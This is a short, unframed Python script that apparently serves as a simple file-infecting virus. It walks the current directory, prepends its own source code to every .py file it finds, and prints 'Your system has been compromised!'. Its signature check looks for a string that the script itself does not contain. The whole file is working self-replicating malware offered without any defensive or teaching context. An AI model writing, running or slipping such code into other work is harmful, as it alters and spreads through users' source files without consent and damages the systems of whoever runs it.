import os
import sys

def find_files(directory, extension):
    infected_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(extension):
                infected_files.append(os.path.join(root, file))
    return infected_files

def infect_files(file_list, virus_code):
    for file in file_list:
        with open(file, "r+") as f:
            content = f.read()
            if "VIRUS_SIGNATURE" not in content:  
                f.seek(0, 0)
                f.write(virus_code + "\n" + content)

def replicate():
    virus_code = []
    with open(sys.argv[0], "r") as f:
        lines = f.readlines()
    for line in lines:
        virus_code.append(line)
    virus_code = "".join(virus_code)

    target_files = find_files(".", ".py")
    infect_files(target_files, virus_code)

def payload():
    print("Your system has been compromised!")  

if __name__ == "__main__":
    replicate()
    payload()